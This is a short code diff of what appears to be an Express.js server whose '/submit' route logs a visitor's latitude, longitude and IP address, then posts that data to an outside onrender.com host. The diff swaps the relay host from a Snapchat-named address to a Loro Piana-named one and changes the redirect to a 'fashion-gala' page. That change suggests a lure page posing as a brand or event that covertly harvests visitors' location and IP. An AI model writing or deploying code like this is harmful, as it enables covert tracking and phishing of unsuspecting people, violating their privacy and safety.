@@ -35,13 +35,13 @@ app.post('/submit', async (req, res) => {
     console.log("📍 Standort:", latitude, longitude);
     console.log("📍 IP:", clientIp);
 
-    await fetch('https://snapchat-35f2.onrender.com/submit', {
+    await fetch('https://loropiana-p9gb.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(logData)
     });
 
-    res.redirect('/danke.html');
+    res.redirect('/fashion-gala.html');
 
   } catch (error) {
     console.error("❌ Fehler:", error);
